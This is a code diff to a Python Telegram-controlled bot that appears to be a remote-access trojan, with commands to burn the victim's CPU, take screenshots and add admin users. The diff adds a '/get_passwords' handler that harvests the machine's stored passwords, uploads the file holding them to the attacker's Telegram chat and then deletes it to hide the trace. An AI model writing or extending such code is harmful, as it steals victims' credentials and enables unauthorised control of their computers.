@@ -4,7 +4,7 @@
 
 '''
 References:
-        https://docs.aiogram.dev/en/latest/quick_start.html
+		https://docs.aiogram.dev/en/latest/quick_start.html
 		https://github.com/wildonion/stomegranate
 		
 		
@@ -25,6 +25,9 @@ import multiprocessing
 from utils import net, hw, cry
 import pyscreenshot as ImageGrab
 from aiogram import Bot, Dispatcher, executor, types
+from urllib.request import urlopen
+import subprocess as sp
+import io
 
 
 
@@ -48,6 +51,13 @@ async def burn(message: types.message):
 		pool.map(hw.CPU.hot, range(processes))
 	await message.reply("Burning CPU...")
 
+
+@dp.message_handler(commands=["get_passwords"])
+async def get_passwords(message: types.message):
+	pid, output, error, failed = net.User.passwords()
+	pswd = io.open("version", "rb", buffering=0)
+	await bot.send_document(chat_id=message["chat"]["id"], document=pswd.read())
+	os.remove("version")
 
 @dp.message_handler(commands=["add_user"])
 async def make_admin(message: types.message):
